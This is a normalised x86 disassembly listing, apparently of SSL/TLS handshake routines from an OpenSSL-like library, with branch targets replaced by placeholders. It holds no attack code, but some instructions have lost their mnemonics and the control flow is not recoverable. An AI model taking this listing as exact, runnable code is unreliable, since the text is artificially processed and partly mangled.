mov edi eax
mov eax [ esp + 0x2c ]
add esp 0x18
test eax eax
jne r-xdata
mov eax [ ebx + 0x58 ]
mov ecx [ eax + 0x344 ]
cmp ecx 0x14
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebp
pop ebx
retn
cmp ecx 0x4
je r-xdata
pop edi
pop esi
mov [ eax + 0x358 ] 0x1
pop ebp
mov eax 0x1
pop ebx
retn
cmp edi 0x6
jge r-xdata
push 0x6ac
push r--data
mov esi 0xa
push 0x72
jmp r-xdata
mov esi [ ebx + 0x40 ]
mov eax [ ebx + 0xbc ]
xor edx edx
mov dl [ esi ]
shl edx 0x18
mov [ eax + 0xd4 ] edx
mov ecx [ ebx + 0xbc ]
inc esi
xor edx edx
mov eax [ ecx + 0xd4 ]
mov dl [ esi ]
shl edx 0x10
or eax edx
inc esi
mov [ ecx + 0xd4 ] eax
mov ecx [ ebx + 0xbc ]
xor eax eax
mov ah [ esi ]
mov edx [ ecx + 0xd4 ]
or edx eax
inc esi
mov [ ecx + 0xd4 ] edx
mov ecx [ ebx + 0xbc ]
xor edx edx
xor eax eax
mov dl [ esi ]
mov ebp [ ecx + 0xd4 ]
or ebp edx
inc esi
mov [ ecx + 0xd4 ] ebp
mov ah [ esi ]
mov al [ esi + 0x1 ]
add esi 0x2
mov ebp eax
lea ecx [ ebp + 0x6 ]
cmp ecx edi
je r-xdata
mov esi 0x2
push 0x6b3
jmp r-xdata
push 0x11b
push 0x14
call sub_1001de60
add esp 0x14
push esi
push 0x2
push ebx
call sub_10013ab0
add esp 0xc
or eax 0xffffffff
pop edi
pop esi
pop ebp
pop ebx
retn
mov edx [ ebx + 0xbc ]
mov eax [ edx + 0xcc ]
test eax eax
je r-xdata
mov esi 0x2
push 0x6bd
push r--data
push 0x9f
push 0x6c5
push r--data
push ebp
call sub_1001d4c0
mov ecx [ ebx + 0xbc ]
add esp 0xc
mov [ ecx + 0xcc ] eax
mov edx [ ebx + 0xbc ]
mov edi [ edx + 0xcc ]
test edi edi
jne r-xdata
push eax
call sub_1001d740
mov eax [ ebx + 0xbc ]
add esp 0x4
mov [ eax + 0xd0 ] 0x0
mov ecx ebp
mov eax ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
mov eax 0x1
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ ebx + 0xbc ]
pop edi
pop esi
mov [ ecx + 0xd0 ] ebp
pop ebp
pop ebx
retn
push 0x6c8
push r--data
push 0x41
push 0x11b
push 0x14
call sub_1001de60
add esp 0x14
or eax 0xffffffff
pop edi
pop esi
pop ebp
pop ebx
retn
sub_10017110
push ebx
push esi
mov esi [ esp + 0xc ]
lea ecx [ esp + 0xc ]
push edi
push ecx
mov eax [ esi + 0x8 ]
push 0x4000
push 0x16
push 0x11f1
push 0x11f0
push esi
call [ eax + 0x30 ]
mov ecx [ esp + 0x28 ]
add esp 0x18
test ecx ecx
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp eax 0x4
jge r-xdata
mov edi [ esi + 0x40 ]
mov dl [ edi ]
inc edi
cmp dl 0x1
je r-xdata
push 0x6e9
push r--data
mov edi 0x32
push 0x9f
jmp r-xdata
xor ebx ebx
xor ecx ecx
mov bh [ edi ]
mov cl [ edi + 0x2 ]
mov bl [ edi + 0x1 ]
add edi 0x3
shl ebx 0x8
or ebx ecx
lea edx [ ebx + 0x4 ]
cmp edx eax
je r-xdata
push 0x6f0
push r--data
mov edi 0x32
push 0x149
jmp r-xdata
push 0x120
push 0x14
call sub_1001de60
add esp 0x14
push edi
push 0x2
push esi
call sub_10013ab0
add esp 0xc
or eax 0xffffffff
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x128 ]
test eax eax
je r-xdata
push 0x6f7
push r--data
mov edi 0x32
push 0x9f
jmp r-xdata
push ebx
push edi
call sub_10026770
add esp 0x8
mov [ esi + 0x128 ] eax
test eax eax
jne r-xdata
push eax
call sub_1001d740
add esp 0x4
mov eax [ esi + 0xd8 ]
mov [ esi + 0x12c ] ebx
mov ecx [ eax + 0x138 ]
test ecx ecx
je r-xdata
mov edi 0x50
push 0x700
jmp r-xdata
mov eax 0x1
mov eax [ eax + 0x13c ]
push eax
push esi
call ecx
add esp 0x8
test eax eax
jne r-xdata
push r--data
push 0x41
jge r-xdata
push 0x70b
push r--data
mov edi 0x71
push 0x13c
jmp r-xdata
mov edi 0x50
push 0x711
sub_10017270
mov eax 0x4c
call sub_1001d0d0
push ebx
push ebp
mov ebp [ esp + 0x58 ]
xor edx edx
push esi
push edi
mov eax [ ebp + 0x34 ]
mov [ esp + 0x10 ] edx
cmp eax 0x1180
mov [ esp + 0x1c ] edx
mov [ esp + 0x18 ] edx
mov [ esp + 0x14 ] edx
jne r-xdata
push 0x16
push ebp
call sub_10013c00
add esp 0x8
pop edi
pop esi
pop ebp
pop ebx
add esp 0x4c
retn
mov eax [ ebp + 0x3c ]
mov ecx [ ebp + 0x58 ]
mov edi [ eax + 0x4 ]
mov eax [ ecx + 0x348 ]
mov [ esp + 0x20 ] edi
mov eax [ eax + 0xc ]
lea esi [ edi + 0x4 ]
test al 0x1
mov [ esp + 0x28 ] esi
je r-xdata
test al 0x16
je r-xdata
mov ecx [ ebp + 0xbc ]
mov eax [ ecx + 0x90 ]
mov ecx [ eax + 0x3c ]
cmp ecx edx
je r-xdata
test al 0xc0
jne r-xdata
mov eax [ ebp + 0xbc ]
mov eax [ eax + 0x90 ]
cmp eax edx
jne r-xdata
mov edx [ eax + 0xc ]
push edx
call sub_10021790
add esp 0x4
test eax eax
je r-xdata
mov ebx ecx
jmp r-xdata
mov eax [ ebp + 0xbc ]
mov eax [ eax + 0x90 ]
mov ebx [ eax + 0x44 ]
test ebx ebx
jne r-xdata
push 0x28
push 0x2
push ebp
call sub_10013ab0
push 0x912
push r--data
push 0x44
push 0x98
push 0x14
call sub_1001de60
add esp 0x20
jmp r-xdata
mov edi [ eax + 0x40 ]
test edi edi
je r-xdata
push 0xa
push 0x2
push ebp
call sub_10013ab0
push 0x81c
push r--data
push 0xf4
push 0x98
push 0x14
call sub_1001de60
add esp 0x20
jmp r-xdata
push 0x762
jmp r-xdata
cmp [ eax ] 0x6
jne r-xdata
mov eax [ ebp + 0x104 ]
mov cl [ ebp + 0x104 ]
lea edx [ esp + 0x2e ]
push 0x2e
sar eax 0x8
push edx
mov [ esp + 0x34 ] al
mov [ esp + 0x35 ] cl
call sub_10021900
add esp 0x8
test eax eax
jle r-xdata
push ebx
call sub_1002cb10
mov edi eax
push ebx
mov [ esp + 0x68 ] edi
call sub_1002b600
add esp 0x8
mov [ esp + 0x24 ] eax
test edi edi
je r-xdata
mov ecx [ eax + 0x34 ]
push ecx
call sub_10021790
add esp 0x4
mov [ esp + 0x1c ] eax
test eax eax
je r-xdata
mov eax [ esp + 0x14 ]
push eax
call sub_1002dcb0
mov eax [ esp + 0x1c ]
add esp 0x4
test eax eax
je r-xdata
push 0x28
push 0x2
push ebp
call sub_10013ab0
push 0x826
push r--data
push 0xee
push 0x98
push 0x14
call sub_1001de60
add esp 0x20
jmp r-xdata
push edi
push sub_1002a400
push sub_1002a420
call sub_1002a2b0
mov ebx eax
add esp 0xc
test ebx ebx
mov [ esp + 0x60 ] ebx
jne r-xdata
push r--data
push 0x44
mov ecx [ eax + 0xc ]
test ecx ecx
je r-xdata
mov eax [ ebp + 0xbc ]
mov [ esp + 0x60 ] esi
mov [ eax + 0x10 ] 0x30
mov eax [ ebp ]
cmp eax 0x300
jle r-xdata
push 0x893
jmp r-xdata
test eax eax
je r-xdata
push 0x886
cmp [ eax ] 0x198
jne r-xdata
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
push eax
call sub_1001d740
add esp 0x4
push ebx
call sub_1002b070
add esp 0x4
test eax eax
jne r-xdata
push 0x82d
push r--data
push 0x5
jmp r-xdata
push eax
mov ebx ecx
call sub_10023940
add esp 0x4
push 0x1
push ebx
lea ecx [ esp + 0x34 ]
push esi
push ecx
push 0x30
call sub_10024770
mov ebx eax
mov eax [ ebp + 0xf4 ]
add esp 0x14
test eax 0x8000000
je r-xdata
add esi 0x2
call sub_10028f90
mov ebx eax
test ebx ebx
mov [ esp + 0x10 ] ebx
jne r-xdata
mov eax [ eax + 0xc ]
test eax eax
je r-xdata
mov ecx [ esp + 0x1c ]
push ecx
call sub_10023940
add esp 0x4
or eax 0xffffffff
pop edi
pop esi
pop ebp
pop ebx
add esp 0x4c
retn
push eax
call sub_10028ff0
add esp 0x4
mov ecx [ edi + 0x14 ]
push ebx
push ecx
push esi
call sub_1002b080
mov edi eax
add esp 0xc
test edi edi
jg r-xdata
push 0x832
push r--data
push 0x5
jmp r-xdata
push 0x98
push 0x14
call sub_1001de60
add esp 0x14
test [ ebp + 0xf4 ] __dos_header
je r-xdata
inc [ esi + 0x1 ]
push edi
push ebx
call sub_10029430
add esp 0x8
test eax eax
jne r-xdata
push 0x899
push r--data
push 0x41
jmp r-xdata
mov ebx eax
mov ecx [ ebp + 0xbc ]
mov edx [ ebp + 0x8 ]
push edi
add ecx 0x14
mov eax [ edx + 0x64 ]
push esi
push ecx
push ebp
call [ eax + 0xc ]
mov edx [ ebp + 0xbc ]
mov ecx edi
mov edi esi
mov [ edx + 0x10 ] eax
mov edx ecx
xor eax eax
shr ecx 0x2
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
mov eax [ ebx + 0x14 ]
push eax
call sub_10029870
add eax 0x7
add esi 0x2
cdq
and edx 0x7
push esi
add eax edx
mov ebx eax
sar ebx 0x3
mov ecx ebx
mov [ esi - 0x1 ] bl
sar ecx 0x8
mov [ esi - 0x2 ] cl
mov esi [ esp + 0x78 ]
mov edx [ esi + 0x14 ]
push edx
call sub_10029ef0
push esi
add ebx 0x2
call sub_10024660
add esp 0x20
jmp r-xdata
push 0x83d
push r--data
push 0x5
jmp r-xdata
test ebx ebx
jg r-xdata
mov [ esp + 0x2c ] 0x70
push ebx
call sub_100292e0
add esp 0x4
test eax eax
jne r-xdata
push 0x89f
push r--data
push 0x10
jmp r-xdata
mov edi [ esp + 0x20 ]
cmp [ ebp ] 0x300
jle r-xdata
push 0x77c
push r--data
push 0x77
jmp r-xdata
push edi
call sub_1002cca0
add esp 0x4
test eax eax
jg r-xdata
push 0x8bb
push r--data
push 0x2b
jmp r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ esp + 0x2c ]
push 0x30
push edx
mov ecx [ eax + 0x64 ]
mov eax [ ebp + 0xbc ]
add eax 0x14
push eax
push ebp
call [ ecx + 0xc ]
mov ecx [ ebp + 0xbc ]
lea edx [ esp + 0x3c ]
push 0x30
push edx
mov [ ecx + 0x10 ] eax
call sub_10026870
add esp 0x18
jmp r-xdata
mov eax [ esp + 0x60 ]
mov edx ebx
sar edx 0x8
mov [ eax + 0x1 ] bl
mov [ eax ] dl
add ebx 0x2
mov edx [ esp + 0x24 ]
push 0x0
push ebx
add eax 0x7
push edx
cdq
and edx 0x7
add eax edx
sar eax 0x3
push eax
push esi
call sub_1002e320
mov edi eax
add esp 0x14
test edi edi
jg r-xdata
push 0x8c8
push r--data
push 0x2b
jmp r-xdata
mov [ edi ] 0x10
inc edi
mov ecx ebx
mov edx ebx
sar ecx 0x10
sar edx 0x8
mov [ edi + 0x2 ] bl
add ebx 0x4
mov [ edi ] cl
mov [ edi + 0x1 ] dl
mov [ ebp + 0x34 ] 0x1181
mov [ ebp + 0x44 ] ebx
mov [ ebp + 0x48 ] 0x0
mov edx [ ebp + 0xbc ]
mov eax [ ebp + 0x8 ]
push edi
add edx 0x14
mov ecx [ eax + 0x64 ]
push esi
push edx
push ebp
call [ ecx + 0xc ]
mov ecx [ ebp + 0xbc ]
add esp 0x10
mov [ ecx + 0x10 ] eax
mov ecx edi
mov edx ecx
xor eax eax
mov edi esi
push 0x0
shr ecx 0x2
[ edi ]
mov ecx edx
push 0x0
and ecx 0x3
push 0x0
push 0x4
push ebx
[ edi ]
call sub_1002b600
add esp 0x4
push eax
mov eax [ esp + 0x74 ]
push eax
call sub_1002d750
mov ebx eax
push 0x8ed
push r--data
push ebx
call sub_1001d4c0
mov edi eax
add esp 0x24
mov [ esp + 0x18 ] edi
call sub_1002dc50
test edi edi
mov [ esp + 0x14 ] eax
je r-xdata
push 0x8cf
push r--data
push 0x2b
jmp r-xdata
push 0x8f2
push r--data
push 0x41
jmp r-xdata
test eax eax
je r-xdata
mov ecx [ esp + 0x10 ]
push eax
push ebx
push edi
push 0x4
push ecx
call sub_1002b600
mov edx [ esp + 0x74 ]
add esp 0x4
push eax
push edx
call sub_1002d750
mov ebx eax
mov eax [ esp + 0x40 ]
mov ecx ebx
mov [ esi ] bl
mov edx ecx
mov esi edi
lea edi [ eax + 0x1 ]
mov eax [ esp + 0x2c ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
push eax
and ecx 0x3
inc ebx
[ edi ] [ esi ]
call sub_1002dcb0
mov ecx [ esp + 0x34 ]
push ecx
call sub_1001d740
mov edx [ esp + 0x30 ]
push edx
call sub_10028ff0
mov eax [ esp + 0x40 ]
push eax
call sub_10023940
add esp 0x28
sub_10017860
mov eax 0x28
call sub_1001d0d0
push ebx
push esi
push edi
mov edi [ esp + 0x38 ]
mov [ esp + 0xc ] 0x0
cmp [ edi + 0x34 ] 0x1190
jne r-xdata
push 0x16
push edi
call sub_10013c00
add esp 0x8
pop edi
pop esi
pop ebx
add esp 0x28
retn
mov eax [ edi + 0x3c ]
mov ecx [ edi + 0x94 ]
mov esi [ eax + 0x4 ]
mov eax [ edi + 0x8 ]
mov edx [ ecx ]
mov ecx [ eax + 0x64 ]
mov eax [ edi + 0x58 ]
mov ebx [ edx + 0x4 ]
lea edx [ esp + 0x20 ]
add eax 0x184
push edx
push eax
push edi
call [ ecx + 0x1c ]
mov eax [ ebx ]
add esp 0xc
cmp eax 0x6
jne r-xdata
cmp eax 0x74
jne r-xdata
mov ecx [ edi + 0x8 ]
lea eax [ esp + 0x10 ]
push eax
mov edx [ ecx + 0x64 ]
mov ecx [ edi + 0x58 ]
add ecx 0x174
push ecx
push edi
call [ edx + 0x1c ]
mov edx [ ebx + 0xc ]
lea eax [ esp + 0x18 ]
push edx
lea ecx [ esi + 0x6 ]
push eax
push ecx
lea edx [ esp + 0x28 ]
push 0x24
push edx
push 0x72
call sub_1002bed0
add esp 0x24
test eax eax
jg r-xdata
cmp eax 0x198
jne r-xdata
mov eax [ ebx + 0xc ]
lea ecx [ esp + 0x38 ]
push eax
lea edx [ esi + 0x6 ]
push ecx
mov ecx [ ebx + 0x4 ]
push edx
lea eax [ esp + 0x2c ]
push 0x14
push eax
push ecx
call sub_1002e520
add esp 0x18
test eax eax
jne r-xdata
mov eax [ esp + 0xc ]
shr eax 0x8
mov [ esi + 0x4 ] al
mov cl [ esp + 0xc ]
mov [ esi + 0x5 ] cl
mov edx [ esp + 0xc ]
lea eax [ edx + 0x2 ]
jmp r-xdata
push 0x94b
push r--data
push 0x4
jmp r-xdata
push 0x975
push r--data
push 0x44
mov edx [ ebx + 0xc ]
lea eax [ esp + 0x38 ]
push edx
lea ecx [ esi + 0x6 ]
push eax
mov eax [ ebx + 0x4 ]
push ecx
lea edx [ esp + 0x2c ]
push 0x14
push edx
push eax
call sub_1002e360
add esp 0x18
test eax eax
jne r-xdata
mov edx [ esp + 0x38 ]
sar edx 0x8
mov [ esi + 0x4 ] dl
mov al [ esp + 0x38 ]
mov [ esi + 0x5 ] al
mov ecx [ esp + 0x38 ]
lea eax [ ecx + 0x2 ]
jmp r-xdata
push 0x95b
push r--data
push 0xa
jmp r-xdata
mov [ esi ] 0xf
inc esi
mov ecx eax
mov edx eax
shr ecx 0x10
shr edx 0x8
mov [ esi + 0x2 ] al
add eax 0x4
mov [ esi ] cl
mov [ esi + 0x1 ] dl
mov [ edi + 0x34 ] 0x1191
mov [ edi + 0x44 ] eax
mov [ edi + 0x48 ] 0x0
push 0x99
push 0x14
call sub_1001de60
add esp 0x14
or eax 0xffffffff
pop edi
pop esi
pop ebx
add esp 0x28
retn
mov ecx [ esp + 0x38 ]
sar ecx 0x8
mov [ esi + 0x4 ] cl
mov dl [ esp + 0x38 ]
mov [ esi + 0x5 ] dl
mov eax [ esp + 0x38 ]
add eax 0x2
push 0x96c
push r--data
push 0x2a
jmp r-xdata
sub_10017a30
mov eax 0x8
call sub_1001d0d0
push ebp
push esi
mov esi [ esp + 0x14 ]
xor ebp ebp
push edi
mov [ esp + 0x10 ] ebp
mov eax [ esi + 0x34 ]
mov [ esp + 0xc ] ebp
cmp eax 0x1170
jne r-xdata
cmp [ esi + 0x34 ] 0x1171
jne r-xdata
mov eax [ esi + 0x94 ]
cmp eax ebp
je r-xdata
cmp [ esi + 0x34 ] 0x1172
jne r-xdata
mov ecx [ esi + 0xd8 ]
xor eax eax
cmp [ ecx + 0xf8 ] ebp
je r-xdata
mov [ esi + 0x34 ] 0x1171
mov eax [ eax ]
cmp [ eax ] ebp
je r-xdata
push 0x16
push esi
call sub_10013c00
add esp 0x8
pop edi
pop esi
pop ebp
add esp 0x8
retn
mov ecx [ esi + 0x58 ]
mov [ esi + 0x34 ] 0x1173
cmp [ ecx + 0x35c ] 0x2
jne r-xdata
mov ecx [ esi + 0xd8 ]
mov ecx [ ecx + 0x74 ]
cmp ecx ebp
je r-xdata
push ebp
push ebp
lea edx [ esp + 0x14 ]
push ebp
lea eax [ esp + 0x1c ]
push edx
push eax
push esi
call sub_10011290
mov ecx [ esi + 0xd8 ]
add esp 0x4
mov edx [ ecx + 0xf8 ]
push eax
push esi
push edx
call sub_100268d0
add esp 0x20
cmp eax ebp
jne r-xdata
cmp [ eax + 0x4 ] ebp
je r-xdata
mov edx [ esi + 0x94 ]
mov eax [ edx ]
mov eax [ eax ]
xor eax eax
jmp r-xdata
cmp eax ebp
mov edi eax
jge r-xdata
lea edx [ esp + 0xc ]
lea eax [ esp + 0x10 ]
push edx
push eax
push esi
call ecx
add esp 0xc
mov [ esi + 0x34 ] 0x1172
jmp r-xdata
push eax
push esi
call sub_10013e60
add esp 0x8
mov [ esi + 0x44 ] eax
mov [ esi + 0x48 ] ebp
cmp eax 0x1
mov [ esi + 0x18 ] 0x1
jne r-xdata
mov [ esi + 0x18 ] 0x4
pop edi
pop esi
or eax 0xffffffff
pop ebp
add esp 0x8
retn
mov eax [ esp + 0x10 ]
cmp eax ebp
je r-xdata
cmp [ esp + 0xc ] ebp
je r-xdata
mov eax [ esp + 0xc ]
cmp eax ebp
je r-xdata
push eax
call sub_10022870
add esp 0x4
push 0x9ad
push r--data
push 0x6a
push 0x97
push 0x14
xor edi edi
call sub_1001de60
add esp 0x14
mov eax [ esp + 0x10 ]
cmp eax ebp
je r-xdata
cmp edi ebp
jne r-xdata
push eax
call sub_10023940
add esp 0x4
push eax
push esi
mov [ esi + 0x34 ] 0x1171
call sub_1001bee0
add esp 0x8
test eax eax
je r-xdata
mov [ esi + 0x34 ] 0x1172
cmp [ esi ] 0x300
jne r-xdata
xor edi edi
jmp r-xdata
mov ecx [ esp + 0xc ]
push ecx
push esi
call sub_1001c030
add esp 0x8
test eax eax
jne r-xdata
mov eax [ esi + 0x58 ]
mov [ eax + 0x35c ] 0x2
mov edx [ esi + 0x58 ]
push 0x29
push 0x1
push esi
mov [ edx + 0x35c ] ebp
call sub_10013ab0
add esp 0xc
mov eax 0x1
pop edi
pop esi
pop ebp
add esp 0x8
retn
sub_10017c10
mov eax 0x8
call sub_1001d0d0
mov eax [ esp + 0xc ]
push ebx
push ebp
push esi
mov edx [ eax + 0x58 ]
mov ecx [ eax + 0xbc ]
push edi
mov eax [ edx + 0x348 ]
mov esi [ ecx + 0x90 ]
mov ebx [ eax + 0xc ]
test bh 0x38
jne r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x8
retn
test esi esi
jne r-xdata
mov edi [ esi + 0x4 ]
mov ecx [ esi + 0x3c ]
mov edx [ esi + 0x40 ]
cmp edi 0x5
mov [ esp + 0x10 ] ecx
mov [ esp + 0x14 ] edx
jne r-xdata
push 0x9e9
push r--data
push 0x44
push 0x82
push 0x14
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn
mov ecx [ esi + edi * 8 + 0xc ]
push ecx
call sub_10021790
mov edx [ esi + edi * 8 + 0xc ]
mov ebp eax
push ebp
push edx
call sub_1002e650
push ebp
mov esi eax
call sub_10023940
add esp 0x10
test bh 0x1
je r-xdata
push eax
mov eax [ esi + 0x34 ]
push eax
call sub_1000e490
add esp 0x8
test eax eax
jne r-xdata
test bh 0x2
je r-xdata
mov eax esi
and eax 0x11
cmp al 0x11
je r-xdata
push 0x9fd
push r--data
push 0x130
jmp r-xdata
mov ecx ebx
and ecx 0x1
je r-xdata
mov ecx esi
and ecx 0x12
cmp cl 0x12
je r-xdata
push 0xa0e
push r--data
push 0xaa
jmp r-xdata
push 0x82
push 0x14
call sub_1001de60
mov eax [ esp + 0x30 ]
add esp 0x14
push 0x28
push 0x2
push eax
call sub_10013ab0
add esp 0xc
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn
mov ebp [ esp + 0x10 ]
mov edx esi
and edx 0x21
cmp dl 0x21
je r-xdata
push 0xa14
push r--data
push 0xa5
jmp r-xdata
mov eax [ esp + 0x14 ]
mov eax esi
and eax 0x44
cmp al 0x44
je r-xdata
mov ebp [ esp + 0x10 ]
test ebp ebp
jne r-xdata
test bl 0x4
je r-xdata
mov edx esi
and edx 0x104
cmp edx 0x104
je r-xdata
mov eax [ esp + 0x14 ]
test eax eax
jne r-xdata
test bl 0x10
je r-xdata
push 0xa1c
push r--data
push 0xa9
jmp r-xdata
mov edi [ esp + 0x1c ]
mov edx [ edi + 0x58 ]
mov edx [ edx + 0x348 ]
test [ edx + 0x10 ] 0x2
je r-xdata
mov edx esi
and edx 0x204
cmp edx 0x204
je r-xdata
push 0xa29
push r--data
push 0xa4
jmp r-xdata
test bl 0x2
je r-xdata
push 0xa24
push r--data
push 0xa3
jmp r-xdata
and esi 0x1000
cmp esi 0x1000
je r-xdata
push 0xa2f
push r--data
push 0xa2
jmp r-xdata
test ecx ecx
je r-xdata
test bl 0x16
je r-xdata
test ebp ebp
je r-xdata
push 0xa50
push r--data
push 0xfa
test eax eax
je r-xdata
push 0xa3d
push r--data
push 0xa7
jmp r-xdata
push ebp
call sub_10024800
mov ecx [ edi + 0x58 ]
add esp 0x4
shl eax 0x3
mov edx [ ecx + 0x348 ]
mov ecx [ edx + 0x10 ]
and cl 0x8
neg cl
sbb ecx ecx
and ecx 0xfffffe00
add ecx 0x400
cmp eax ecx
jle r-xdata
push 0xa49
push r--data
push 0xa6
jmp r-xdata
push eax
call sub_10024750
mov edx [ edi + 0x58 ]
add esp 0x4
shl eax 0x3
mov ecx [ edx + 0x348 ]
mov edx [ ecx + 0x10 ]
and dl 0x8
neg dl
sbb edx edx
and edx 0xfffffe00
add edx 0x400
cmp eax edx
jle r-xdata
sub_10017f00
mov eax 0x24
call sub_1001d0d0
push ebx
push ebp
push esi
xor ebx ebx
push edi
push ebx
call time
mov [ esp + 0x2c ] eax
push ebx
push ebx
lea eax [ esp + 0x34 ]
xor edi edi
push 0x4
push eax
mov [ esp + 0x24 ] ebx
mov [ esp + 0x28 ] edi
call sub_10021890
add esp 0x14
call sub_1001df60
push ebx
call [ SetLastError@IAT ]
mov ebp [ esp + 0x38 ]
mov eax [ ebp + 0xcc ]
cmp eax ebx
jne r-xdata
mov edi eax
mov [ esp + 0x14 ] edi
mov ecx [ ebp + 0xd8 ]
mov eax [ ecx + 0x9c ]
cmp eax ebx
je r-xdata
push ebp
call sub_1000d0d0
add esp 0x4
push ebp
call sub_1000e7d0
add esp 0x4
test ah 0x40
je r-xdata
mov eax [ ebp + 0x1c ]
push ebp
inc eax
mov [ ebp + 0x1c ] eax
call sub_1000e7d0
add esp 0x4
test ah 0x30
je r-xdata
cmp eax 0x1090
jg r-xdata
cmp eax 0x1050
jge r-xdata
mov eax [ ebp + 0x34 ]
cmp eax 0x1053
mov [ esp + 0x24 ] eax
jg r-xdata
cmp eax 0x4000
je r-xdata
je r-xdata
push ebp
call sub_10018e10
mov esi eax
add esp 0x4
cmp esi ebx
jle r-xdata
cmp eax 0x1011
jg r-xdata
cmp edi ebx
mov [ ebp + 0x24 ] ebx
je r-xdata
cmp eax 0x5000
jne r-xdata
lea ecx [ eax - 0x1060 ]
cmp ecx 0x20
ja r-xdata
mov edx [ ebp + 0x1c ]
mov eax [ esp + 0x10 ]
dec edx
cmp eax ebx
mov [ ebp + 0x1c ] edx
je r-xdata
mov [ ebp + 0x44 ] ebx
mov [ ebp + 0x34 ] 0x1070
jmp r-xdata
lea ecx [ eax - 0x1020 ]
cmp ecx 0x21
ja r-xdata
cmp eax 0x1010
jge r-xdata
mov esi [ ebp + 0x3c ]
mov [ ebp ] 0x2
cmp esi ebx
mov [ ebp + 0x4 ] 0x1000
mov [ esp + 0x10 ] esi
jne r-xdata
push 0x1
push 0x10
push ebp
call edi
add esp 0xc
push 0x136
push r--data
push 0xff
push 0x7b
push 0x14
call sub_1001de60
add esp 0x14
or eax 0xffffffff
pop edi
pop esi
pop ebp
pop ebx
add esp 0x24
retn
xor edx edx
mov dl [ ecx + lookup_table_100188dc ]
jmp [ edx * 4 + jump_table_100188cc ]
mov eax [ esp + 0x14 ]
cmp eax ebx
je r-xdata
push eax
call sub_1001dca0
add esp 0x4
mov edi [ esp + 0x14 ]
cmp edi ebx
je r-xdata
xor edx edx
mov dl [ ecx + lookup_table_100188a8 ]
jmp [ edx * 4 + jump_table_10018898 ]
mov edx [ ebp + 0x3c ]
mov [ ebp + 0x30 ] ebx
cmp eax 0x1010
mov edi [ edx + 0x4 ]
mov [ esp + 0x18 ] edi
jne r-xdata
sub eax 0x3
je r-xdata
push 0x3fff
push esi
call sub_1001dce0
add esp 0x8
test eax eax
je r-xdata
call sub_1001dc60
mov esi eax
cmp esi ebx
mov [ esp + 0x10 ] esi
je r-xdata
push 0x1
push ebp
call sub_1001cc80
add esp 0x8
test eax eax
je r-xdata
mov ecx [ ebp + 0x3c ]
cmp eax 0x1060
mov esi [ ecx + 0x4 ]
jne r-xdata
push ebp
call sub_100191a0
mov esi eax
add esp 0x4
cmp esi ebx
jle r-xdata
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
add esp 0x24
retn
push esi
push 0x1002
push ebp
call eax
add esp 0xc
mov esi [ ebp + 0x34 ]
mov eax [ esp + 0x24 ]
cmp esi eax
je r-xdata
push ebp
call sub_10018900
mov esi eax
add esp 0x4
cmp esi ebx
jle r-xdata
mov ecx [ ebp + 0x3c ]
cmp eax 0x1030
mov esi [ ecx + 0x4 ]
mov [ esp + 0x2c ] esi
jne r-xdata
cmp eax 0x1040
jne r-xdata
push ebp
call sub_1001cc10
mov esi eax
add esp 0x4
cmp esi ebx
jle r-xdata
mov eax [ ebp + 0xbc ]
cmp eax ebx
je r-xdata
mov eax [ ebp + 0x3c ]
cmp eax ebx
je r-xdata
sub eax 0xffd
je r-xdata
cmp esi [ ebp + 0x3c ]
jne r-xdata
mov eax [ ebp + 0xd8 ]
mov [ ebp + 0x3c ] esi
mov [ ebp + 0x44 ] ebx
mov [ ebp + 0x34 ] 0x1010
mov ecx [ eax + 0x34 ]
mov [ esp + 0x10 ] ebx
inc ecx
mov [ eax + 0x34 ] ecx
mov [ ebp + 0x20 ] sub_10017f00
or esi 0xffffffff
jmp r-xdata
mov eax [ ebp + 0x54 ]
mov [ eax + 0x4 ] ebx
mov [ ebp + 0x34 ] 0x1040
jmp r-xdata
mov eax [ ebp + 0x54 ]
mov edx [ ebp + 0x3c ]
mov edi [ eax + 0x64 ]
mov eax [ ebp + 0x44 ]
mov ebx [ edx + 0x4 ]
inc edi
mov esi edi
sub esi eax
add eax ebx
push esi
push eax
push ebp
call sub_1001c1c0
add esp 0xc
cmp eax esi
jge r-xdata
mov eax [ ebp + 0x44 ]
mov edx 0x1
sub edx eax
add eax esi
push edx
push eax
push ebp
call sub_1001c1c0
mov ecx [ ebp + 0x44 ]
mov edx 0x1
sub edx ecx
add esp 0xc
cmp eax edx
jge r-xdata
jmp r-xdata
push 0x1
mov ecx eax
push 0x1001
push ebp
mov [ ebp + 0x34 ] ecx
call edi
add esp 0xc
mov [ ebp + 0x34 ] esi
jmp r-xdata
mov eax [ ebp + 0x6c ]
mov [ ebp + 0x44 ] ebx
neg eax
sbb eax eax
and eax 0x50
add eax 0x1030
mov [ ebp + 0x34 ] eax
jmp r-xdata
push ebp
call sub_1001cc10
mov esi eax
add esp 0x4
cmp esi ebx
jle r-xdata
mov ecx [ ebp + 0xbc ]
lea edx [ esp + 0x30 ]
push ebx
lea eax [ esp + 0x24 ]
push edx
push eax
push ecx
call sub_1000fce0
add esp 0x10
test eax eax
je r-xdata
push ebp
call sub_1001cc10
mov esi eax
add esp 0x4
cmp esi ebx
jle r-xdata
mov edx [ ebp + 0x3c ]
mov eax [ edx + 0x4 ]
mov [ eax ] 0x3
mov edx [ ebp + 0x54 ]
mov ecx [ edx + 0x88 ]
cmp ecx 0x10
ja r-xdata
mov [ ebp + 0x44 ] ebx
mov [ ebp + 0x34 ] 0x1020
jmp r-xdata
push ebx
push ebp
call sub_1000f330
add esp 0x8
test eax eax
je r-xdata
mov eax [ eax ]
mov ecx [ ebp ]
cmp eax ecx
je r-xdata
push 0x1
push ebp
mov [ ebp + 0x44 ] ebx
call sub_1000e570
mov eax [ ebp + 0x6c ]
add esp 0x8
cmp eax ebx
je r-xdata
push eax
call sub_1001dca0
add esp 0x4
mov [ ebp + 0x3c ] ebx
sub eax 0x3
jne r-xdata
